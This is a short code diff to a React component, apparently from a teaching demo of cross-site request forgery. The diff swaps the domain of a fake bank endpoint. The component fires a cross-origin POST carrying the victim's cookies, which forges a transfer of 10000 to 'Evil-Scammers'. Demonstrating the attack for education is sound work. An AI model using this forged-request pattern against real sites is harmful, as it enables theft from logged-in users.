@@ -17,7 +17,7 @@ export default function CSRFPostButton(props: Props) {
 
   const onClick = useCallback(() => {
     const body = new URLSearchParams('amount=10000&description=Gotcha!&to=Evil-Scammers');
-    fetch('https://dsb.victorzhou.com/transfer', {
+    fetch('https://dsb.zhiachong.com/transfer', {
       body,
       credentials: 'include', // include cookies, despite being a cross-origin request
       method: 'post',
